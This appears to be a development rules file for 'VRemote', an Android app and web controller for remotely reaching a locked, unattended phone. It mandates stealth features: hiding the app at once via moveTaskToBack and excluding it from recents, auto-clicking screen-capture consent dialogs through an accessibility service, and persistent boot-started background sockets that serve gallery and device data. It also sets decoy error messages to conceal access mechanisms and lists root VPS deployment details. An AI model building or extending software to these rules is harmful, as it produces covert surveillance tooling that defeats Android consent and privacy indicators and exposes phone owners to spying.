# VRemote Development Rules & Inviolable Architectural Principles

> **MANDATORY ORDER & HIGHEST PRIORITY:**
> All features and bug fixes must preserve **100% reliable background waking, remote calling, video calling, screen sharing with control, and gallery/video browsing when the Android app is closed or the phone is locked**. Under no circumstances should any code change degrade or break this behavior.

---

## 1. Closed-App & Lock-Screen Remote Waking Architecture

The Android app runs in an unattended setup (e.g. phone plugged into a charger in another room). The user controls it remotely from a laptop or desktop web browser.

### A. Dual Socket Model (24/7 Connectivity)
Every Android device running VRemote maintains TWO sockets:
1. **Background Socket (`mBgSocket` in `RemoteAccessibilityService`):**
   - Stays connected 24/7 as an Android Accessibility Service.
   - Auto-reconnects with infinite retry attempts (`opts.reconnection = true`, `reconnectionAttempts = Integer.MAX_VALUE`).
   - Automatically registers device via `registerDeviceBackground()` on every connect/reconnect.
   - Handles `get_gallery`, `get_videos`, `get_media_detail`, and `get_device_info` directly in the background without needing to launch an activity.
   - Handles `audio_call`, `video_call`, `screen_share`, and `screen_share_control` by acquiring a `FULL_WAKE_LOCK | ACQUIRE_CAUSES_WAKEUP` and launching `MainActivity`.
2. **Foreground Socket (`socket` in `WebRTCCompanion`):**
   - Active while `MainActivity` is open.
   - Handles WebRTC peer connection, media streaming, and real-time remote touch dispatching.

### B. Multi-Socket Device Registry in `server.js`
- `deviceRegistry` in `server.js` MUST track all active sockets for each device using a `Set<string>`: `device.sockets = new Set()`.
- **CRITICAL:** When `MainActivity` closes or disconnects, `server.js` must remove ONLY that socket from `device.sockets`.
- As long as `device.sockets.size > 0` (e.g. `mBgSocket` is alive):
  - `device.online` MUST REMAIN `true`.
  - `device.socketId` MUST fallback to the remaining active socket (`Array.from(device.sockets)[0]`).
  - Action buttons (Audio Call, Video Call, Screen Share, Touch Control, Gallery, Videos, Info) on the web UI must remain ENABLED and interactive at all times.
- Auto-commands sent from browser MUST be dispatched to all active sockets of the target device (`device.sockets`).

### C. Lock Screen & Screen-Off Activity Launch (Android 10 - 14)
When `MainActivity` is launched while the phone is locked or screen is off:
1. **`AndroidManifest.xml`:**
   - `.MainActivity` MUST have `android:showWhenLocked="true"` and `android:turnScreenOn="true"` (do NOT add `showForAllUsers` as it is a system-only attribute that causes `INSTALL_PARSE_FAILED_MANIFEST_MALFORMED`).
   - Manifest MUST declare `android.permission.WAKE_LOCK` and `android.permission.DISABLE_KEYGUARD`.
2. **`MainActivity.onCreate()` & `MainActivity.onNewIntent()`:**
   - Must call `setShowWhenLocked(true)` and `setTurnScreenOn(true)` (API >= 27).
   - Must call `KeyguardManager.requestDismissKeyguard(this, null)`.
   - Must set `FLAG_KEEP_SCREEN_ON` on the window.
3. **`RemoteAccessibilityService.wakeUpAndLaunch()`:**
   - Must acquire a temporary `PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP` (15 seconds) to illuminate display immediately.

### D. Cold Start Asynchronous Offer Queuing
- When `MainActivity` is cold-launched by an incoming call command, `WebRTCCompanion` takes 500ms–2000ms to establish its WebSocket connection.
- `WebRTCCompanion` MUST implement `pendingOfferPayload`.
- If `createAndSendOffer` executes before `socket.connected()`, the offer payload MUST NOT be dropped; it is queued in `pendingOfferPayload` and automatically emitted on `Socket.EVENT_CONNECT`.

### E. Selective End Call Handling
- NEVER broadcast `auto-command: "end_call"` to all registered devices.
- `end-call` socket events must only target the specific peer or active session involved in that call.

### F. Stealth / Immediate Backgrounding (`moveTaskToBack(true)`)
- When any session is triggered remotely (audio call, video call, screen share, screen share with control), `MainActivity` MUST immediately call `moveTaskToBack(true)` as soon as the session begins.
- The VRemote application UI MUST NEVER remain open or visible on the phone's physical screen. The phone must show its normal home screen / launcher or whatever app was open.
- When `end_call` / disconnect command is received, the app must also call `moveTaskToBack(true)` to ensure it never pops up.

### G. Unattended "Entire Screen" MediaProjection Auto-Accept
- On Android 14+ devices (including Infinix/Transsion XOS, Xiaomi, Samsung, AOSP), `RemoteAccessibilityService` MUST automatically:
  1. Click the spinner if it shows "Single app" to open the mode dropdown.
  2. Select "Entire screen" / "Whole screen" automatically.
  3. Click "Start now" / "Start recording" without any manual button press on the phone.
- `onAccessibilityEvent` must NOT restrict by package name when `sAutoAcceptPending` is true.

### H. Registered Device Disconnect / End Button & Forceful Hardware Release
- Every Registered Device card on the web interface MUST include a clean Disconnect indicator: A green pulsing dot with text `Connected` and a red `/ Disconnect` button.
- When clicked, it MUST immediately dispatch `end_call` to the target device.
- On Android, `MainActivity.stopAllMediaAndFinish()` MUST forcefully stop camera capturers, stop `ScreenCaptureService`, dispose texture helpers, mute audio tracks, and hide the activity to background via `moveTaskToBack(true)` with `android:excludeFromRecents="true"`, instantly removing Android's green camera privacy indicator while keeping `RemoteAccessibilityService` and its background socket alive 24/7 for unlimited subsequent calls.

### I. Browser-Side Camera & Microphone Auto-Mute (STRICT USER RULE)
- **Zero Local Transmission on Remote Calls:** When calling a registered device from the desktop/laptop web browser (Audio Call, Video Call, Screen Share, Screen Share with Touch Control):
  1. The browser's local webcam MUST NEVER turn on. `getUserMedia` must never request camera video when connecting to a registered device. Any existing webcam tracks must be immediately stopped and disabled (`track.stop()`, `track.enabled = false`).
  2. The browser's local microphone MUST be automatically MUTED (`track.enabled = false`, `isMicOn = false`).
  3. The browser only receives and monitors the remote phone's video, audio, and screen feeds. It does not transmit laptop camera or audio unless the user manually un-mutes.
  4. Web UI controls (`#toggle-camera` and `#toggle-mic`) must immediately reflect: Camera blocked/off (`fas fa-user-slash`), Microphone muted (`fas fa-microphone-slash`).
  5. Any incoming call offer from a registered device (or initiated via registered devices panel) MUST BE AUTO-ACCEPTED immediately without ringing tone or requiring manual acceptance.

---

## 2. Directory Synchronization (`public/` and `app/`)
- The repository has two web root directories: `/public/` and `/app/`.
- Every HTML, CSS, and JS change made to `public/` MUST be replicated identically in `app/`, and vice versa.

---

## 3. Deployment Protocol
After any change affecting the Android APK or backend:
1. Commit and push to Git `main`.
2. Pull on VPS (`root@201.18.218.29`, `/root/v-webrtc`).
3. Compile APK using Gradle (`/root/gradle-8.5/bin/gradle assembleRelease --no-daemon`).
4. Copy compiled APK to `/root/v-webrtc/public/downloads/vremote.apk` and `/root/v-webrtc/app/downloads/vremote.apk`.
5. Restart PM2 (`pm2 restart v-webrtc`).
6. Verify APK download URL returns HTTP 200 with new timestamp.

---

## 4. Website Call, Camera Auto-Open & Privacy Media Policy (STRICT USER RULES - 100% INVIOLABLE)

- **Point 1: URL UID Immediate Camera & Mic Auto-Open (`?uid=...`):**
  - Whenever the web app is loaded with a UID parameter in the URL (`?uid=xxx`, `?ui=xxx`, `?id=xxx`, or hash `#uid=xxx`), the initial security lock overlay MUST be bypassed immediately (`html.bypass-lock`).
  - Local camera and microphone hardware MUST be activated immediately with zero popups, zero manual clicks, and zero delays.
  - The live camera preview MUST be visibly rendering on screen (`localVideo` element playing with `muted` attribute, `localVideoContainer` active and visible, selfie mirror applied).
  - The browser controls (`#toggle-camera`, `#toggle-mic`) must reflect active ON states (`fas fa-user`, `fas fa-microphone`).
  - Camera acquisition MUST use multi-tier fallback (best video stream, unified stream, and standalone video+audio merging) so camera hardware never fails or drops into an audio-only state on page load.

- **Point 2: Strict Separation of Call vs. Screen Sharing & Floating End Sharing Badge Lifecycle:**
  - When initiating or receiving an Audio Call or Video Call from the website (or auto-calling a deal partner with matching UID):
    - Under NO circumstances should any "Sharing", "End Sharing", or screen sharing UI appear.
    - The floating button `#floating-end-stream-btn` ("End Sharing") MUST ONLY be displayed when actual screen sharing (`isScreenSharing || screenPeerConnection`) is active.
    - Regular audio and video calls MUST ONLY show "End Call" (`#floating-end-call-btn` or dock `#end-call-btn`).
    - Incoming call offers between website peers or matching UID partners must never be falsely classified as registered device calls (`from.length >= 8` check is strictly forbidden).
  - **Floating End Sharing Badge Aesthetics & Lifecycle (v6.4.9):**
    - Opacity & Glassmorphism: Set to 50% opacity translucent red (`background: rgba(239, 68, 68, 0.5)`) with `backdrop-filter: blur(14px)`.
    - Shimmer Effect: Features a continuous animated subtle light sweep (`@keyframes streamBtnShimmer`).
    - Auto-Hide & Swipe Up: After 2.5 to 3 seconds of screen sharing activity, the badge automatically glides upwards off-screen (`.swiped-up` with `transform: translate(-50%, -85px); opacity: 0; pointer-events: none;`).
    - Interactive Re-reveal: Moving cursor within 65px of top screen edge or touching near top immediately pulls the badge back down and restarts the timer. Hovering over the button holds it visible until cursor leaves.
    - Absolute Lifecycle Cleanup: When a call or stream ends (via `endCall`, `closeScreenShareStream`, `socket.on("end-call")`, or registered device disconnect), `#floating-end-stream-btn` MUST be cleanly reset, hidden (`display: none`), timer cleared, and `screenPeerConnection` destroyed so the badge never lingers.
  - **Participants Icon (v6.4.9):**
    - The dock button `#toggle-participants-btn` and drawer header `#drawer-header-icon` feature the custom 3D Polished Aluminum Group emblem (`images/participants-icon.png`) on dark graphite squircle, giving a premium iPhone/iOS Cupertino aesthetic.

- **Point 3: Tab Switch, Minimizing, Focus Loss & Inactivity Privacy Policy (STRICT USER RULES):**
  - **When NO call is connected (Idle State):**
    - Switching to another browser tab (`document.visibilityState === 'hidden'`), minimizing the browser window, losing window focus (`window.onblur`), or navigating away / closing Chrome MUST immediately turn OFF the local camera and microphone hardware by calling `track.stop()` on all tracks.
    - Hardware camera LED and browser address bar privacy indicators (green dot/camera icon) MUST extinguish completely.
    - Returning to the tab / restoring the browser window / regaining focus (`document.visibilityState === 'visible'` or `window.onfocus`) MUST automatically re-acquire the camera and microphone and resume live preview without manual user intervention.
  - **When a call IS connected (`activePeer && peerConnection`):**
    - Switching tabs, minimizing the browser, or switching windows / losing focus MUST NOT stop, mute, or interrupt the camera or microphone. The live call, audio streaming, and video streaming MUST continue 100% uninterrupted in the background across foreground and background states.
  - **Strict Manual-Only Picture-in-Picture (NEVER AUTOMATIC):**
    - Picture-in-Picture (PiP) MUST NEVER open automatically on tab switch, window minimize, app leave, home button press, or call start.
    - Modern Chrome and Android WebView must have auto-PiP strictly disabled (`setAutoEnterEnabled(false)` in Android `MainActivity.java` and no auto-PiP triggers in Web JS).
    - Picture-in-Picture may ONLY be entered when the user explicitly clicks the Picture-in-Picture button inside the More popover menu (`#more-item-pip` / `window.VRemoteNative.enterPip()`). If the user merely switches tabs or minimizes without clicking the PiP option, NO floating PiP window should appear.

- **Point 4: Guaranteed Dual-Side Call End Synchronization & Dynamic In-Call Audio/Video Mode Switching with Receiver Privacy Guard:**
  - **Guaranteed Dual-Side Call End:**
    - Whenever either party (User 1 or User 2, from web or mobile app) ends or declines a call, the `end-call` signaling packet MUST be guaranteed to route to the other peer via exact username, socket ID, case-insensitive, or base-UID prefix matching in `server.js`.
    - Both peers MUST immediately terminate peer connections, stop remote audio/video tracks, clear incoming/ringing timers, hide active call bars and floating buttons, and cleanly return to the idle state. No side may remain hung, frozen, or in an orphaned call state.
  - **Dynamic In-Call Audio ↔ Video Mode Switching:**
    - Switching to **Audio Mode** (`mode: "audio"`): Both sides immediately disable camera video tracks, hide video viewports, and activate the call card with avatar rings and reactive voice wave animations.
    - Switching to **Video Mode** (`mode: "video"`):
      - **Initiator (User 1):** Enables their camera immediately, transmits their live video stream to User 2, and displays Video Mode UI.
      - **Receiver (User 2) Privacy Guard:** Under NO circumstances may User 2's camera turn on automatically upon receiving a video switch request. User 2's local camera MUST remain MUTED/DISABLED, and their dock button MUST be set to the **slashed state (`fas fa-user-slash`)** with watermark active.
      - User 2's camera is only enabled when User 2 explicitly clicks the slashed button (un-slashes to `fas fa-user`), granting explicit consent to transmit their face video.

- **Point 5: Incoming Call Hold-to-Accept & Alert Bar Integrity:**
  - **Hold-to-Accept (`#btn-incoming-accept`):**
    - An incoming call MUST NOT be accepted on a single tap or quick click.
    - An incoming call is accepted ONLY when the user holds (presses & holds) the accept icon for **450ms**.
    - If the user releases or taps quickly before 450ms, the icon MUST trigger a shake animation (`.shake-error`), subtle vibration, and display decoy toast *"error: try after 10 minutes"* (so unauthorized users cannot discover the hold-to-accept mechanism).
    - Reaching the full 450ms threshold vibrates with confirmation and accepts the call.
  - **Floating End Call Button Exclusion During Incoming Call:**
    - The floating red End Call button (`#floating-end-call-btn`) MUST NEVER appear while an incoming call alert is ringing (`incomingCallData`).
    - The incoming call alert bar (`#incoming-call-bar`) has its own dedicated minimal Accept and Decline icons. Showing the floating End Call button simultaneously causes it to overlap the incoming alert bar.
    - `#floating-end-call-btn` is ONLY shown during outgoing calls (`callingPeer`) or actively connected calls (`activePeer`).

- **Point 6: Initial Stealth Security Lock Overlay PIN (`7861`) & Bypass Rules:**
  - The security lock popup/overlay PIN code is strictly **`7861`** (`SECURITY_PIN = "7861"` in `main.js`).
  - Validation requires holding the back/verify button for **1200ms** (`HOLD_SECURITY_MS = 1200`).
  - Entering an incorrect PIN or releasing before 1200ms triggers a shake animation (`.shake-error`) and decoy error toast: *"Error: Try again later after 10 minutes."*
  - Entering `7861` and holding for 1200ms automatically verifies and activates the full application session.
  - If the web app is opened with any UID parameter in the URL (`?uid=...`, `?id=...`, etc.), the security lock overlay is bypassed instantly before DOM render (`html.bypass-lock`).

- **Point 7: Participant Sheet vs. Registered Devices View Separation:**
  - Inside the drawer (`#drawer-view`), clicking the info icon (`#btn-view-registered-devices`) toggles between the Participants list and the Registered Devices list.
  - **Strict UI Cleanliness Rule:** The Display Name input, Room/User ID box, and Join/Update button (`#drawer-user-box`) MUST ONLY exist and display inside the Participants view (`#drawer-participants-view`).
  - When viewing Registered Devices (`#drawer-registered-devices-view`), `#drawer-user-box` MUST BE COMPLETELY HIDDEN (`display: none !important;`). The Registered Devices view must contain ONLY the registered devices cards without any search fields, display name inputs, or update buttons.

- **Point 8: Registered Device Action Loading, Real Connection State & In-Place Orange Error Replacement:**
  - When clicking any action button (Audio Call, Video Call, Screen Share, Screen Control, Gallery, Videos, Info):
    1. The clicked button immediately displays an active loading spinner (`.btn-action-loading`).
    2. The "Connected" state (green pulsing dot) MUST ONLY be displayed when the actual connection is established (i.e. WebRTC tracks received or ICE state reaches `connected`). Falsely showing "Connected" immediately upon clicking is strictly prohibited.
    3. **In-Place Error Replacement (Orange Text Only):** If a connection fails or errors out (e.g. timeout, WebRTC error, device unreachable):
       - The subtitle text *"Without touching phone"* (`#reg-dev-subtitle-...`) is replaced directly in-place with the actual error reason.
       - The error text MUST be clean orange (`color: #ff9f0a; font-weight: 600; font-size: 11px;`).
       - Strictly NO outlines, NO borders, NO background containers, NO alerts underneath pushing layout down — just clean in-place text replacement to preserve UI space.
    4. The Disconnect button (`/ Disconnect`) remains active to allow resetting or canceling at any time.

- **Point 9: 24/7 Persistent BackgroundKeepAliveService, WorkManager & Coturn TURN Traversal:**
  - **Persistent Foreground Companion Service (`BackgroundKeepAliveService`):**
    - Runs 24/7 with a low-priority ongoing notification (`FOREGROUND_SERVICE_CONNECTED_DEVICE`) and holds `PARTIAL_WAKE_LOCK` + high-performance WiFi lock.
    - Connects directly to `https://v.tokendeal.cloud` and auto-registers with `role: "background_service"`.
    - Handles incoming `audio_call`, `video_call`, `screen_share`, `get_gallery`, `get_videos`, and `get_device_info` 24/7 even when `MainActivity` is closed, swiped away from Recents, or phone is locked.
    - Automatically started by `MainActivity.onCreate()`, `onResume()`, `BootReceiver.onReceive()`, and `KeepAliveWorker.doWork()`.
    - `MainActivity.onBackPressed()` pushes activity to background (`moveTaskToBack(true)`) instead of finishing, ensuring immediate resume capability.
  - **WorkManager KeepAlive Engine (`KeepAliveWorker` & `BootReceiver`):**
    - Periodic WorkManager worker (`KeepAliveWorker`) runs every 15-30 minutes, ensuring `BackgroundKeepAliveService` stays active across all Android OEMs.
    - `BootReceiver` listens for `BOOT_COMPLETED`, `MY_PACKAGE_REPLACED`, and `QUICKBOOT_POWERON` to automatically start `BackgroundKeepAliveService` on device startup or app update.
  - **Accessibility Service Integration & Prompt (`RemoteAccessibilityService`):**
    - When enabled by the user in Android Settings, `RemoteAccessibilityService` provides remote touch injection and auto-clicks "Entire screen" / "Start now" screen capture dialogs.
    - If disabled on launch, `MainActivity` displays a helpful one-click dialog guiding the user to turn on "VRemote Screen Share" in Accessibility Settings.
  - **Coturn TURN Traversal in `WebRTCCompanion.java`:**
    - Mobile cellular carriers (NAT/Firewalls) block direct P2P connections resulting in `WebRTC ICE connection failed (Network/Firewall error)`.
    - Android WebRTC peer connections MUST include VPS Coturn TURN (`turn:201.18.218.29:3478` with UDP and TCP transports) and OpenRelay TURN servers alongside Google STUN with `GATHER_CONTINUALLY` ICE gathering policy.

- **Point 10: Screen Share Modal Dynamic Version Display:**
  - In the Screen Share companion modal (`#vremote-companion-modal`), whenever a new version is released, the badge (`<b style="color: #34c759;">vX.X.X (Latest)</b>`), download link (`/downloads/vremote.apk?v=X.X.X`), and button text (`Download APK vX.X.X`) must explicitly state the exact latest version number so users always know which APK version they are downloading.

- **Point 11: Chat Media & Video Playback (Strict No-PiP, Inline Bubble Playback, Animated Progress Loader):**
  - Chat videos load with an animated sliding gradient progress bar (`.chat-video-progress-bar`).
  - Once buffered, videos play strictly inline within the chat bubble.
  - Under NO circumstances can chat videos or images be opened in Picture-in-Picture (PiP), neither on the website nor inside the Android app WebView.

- **Point 12: Android 14 MediaProjection Single-Use Token Rule & Crash Guard:**
  - In Android 14 (API 34+), Android enforces a strict single-use policy on `MediaProjection` resultData intent tokens. Reusing an intent token throws `SecurityException: Don't re-use the resultData to retrieve the same projection instance, and don't use a token that has timed out. Don't take multiple captures by invoking MediaProjection#createVirtualDisplay multiple times on the same instance.`
  - `captureIntentData` MUST NEVER be cached or reused across sessions. It must be cleared immediately after passing to the capturer (`captureIntentData = null`).
  - Every screen capture session must request a fresh token via `projectionManager.createScreenCaptureIntent()` (auto-accepted by `RemoteAccessibilityService`).
  - Any prior `screenCapturer` and `surfaceTextureHelper` must be safely stopped and disposed before creating a new capturer.
  - `Thread.setDefaultUncaughtExceptionHandler` protects background threads so unexpected runtime exceptions never crash the process.

- **Point 13: Re-entrancy Loop Guard & Instant Remote Crash Reporting:**
  - **StackOverflow Prevention (`isStoppingMedia` Guard):** Calling `stopAllMediaAndFinish()` must never trigger an infinite recursive loop with `webRTCCompanion.endCall(false)` and `onCallEnded()`. Both `stopAllMediaAndFinish()` and `onCallEnded()` are protected by a strict re-entrancy boolean guard (`isStoppingMedia`). In `WebRTCCompanion.endCall()`, `callback.onCallEnded()` is only invoked if a call was actively in progress (`wasInCall`).
  - **Live Remote Crash Tracing (`/api/crash-log`):** `CrashReporter` captures all unhandled exceptions, thread IDs, device hardware models, and full stack traces, sending them via synchronous HTTP POST to `https://v.tokendeal.cloud/api/crash-log`. All crash reports are logged in real-time in PM2 logs and appended to `/root/v-webrtc/crash.log` for immediate forensic analysis.

- **Point 14: Strict Idle Hardware Off Rule (Camera & Microphone 100% OFF when NO Call is Active):**
  - **Zero Idle Hardware Retention:** Whenever no call is active (`!isInCall()` and `!isCallOrStreamActive()`), Android camera and microphone hardware MUST be completely off and released across foreground, background, and closed states.
  - In `WebRTCCompanion.java`, `audioSource` and `localAudioTrack` are NEVER initialized at startup. They are dynamically created via `ensureAudioTrack()` strictly when a call connects or starts, and are forcefully disposed (`dispose()`) and nulled in `endCall()`.
  - In `MainActivity.java`, on `onPause()` or `stopAllMediaAndFinish()`, WebView evaluates `shutdownIdleMediaHardware()`.
  - In `main.js`, `shutdownIdleMediaHardware()` terminates all active media tracks if no call is active (`!isCallOrStreamActive()`). In the native companion app, camera and microphone hardware are NEVER initialized in the WebView on startup, saving battery and extinguishing all green privacy indicators.
  - When a call IS actively connected, media streams remain 100% live and uninterrupted in the background across foreground and background states.

- **Point 15: Crash-Proof Remote Control Touch Injection & Main Thread Dispatch:**
  - In `WebRTCCompanion.java`, `handleRemoteControlMessage` receives gesture commands from WebRTC DataChannels or socket threads. It MUST ALWAYS dispatch gestures via `new Handler(Looper.getMainLooper()).post(...)`.
  - In `RemoteAccessibilityService.java`, `performTap()` and `performSwipe()` must validate against `NaN` and `Infinite` coordinates, clamp between 0.0f and 1.0f, pass `new Handler(Looper.getMainLooper())` as the third parameter to `dispatchGesture()`, and wrap all dispatching and global actions (`performBack()`, `performHome()`, `performRecentApps()`) in `try { ... } catch (Throwable t) { ... }` so gesture injection can never throw unhandled exceptions or crash the process.
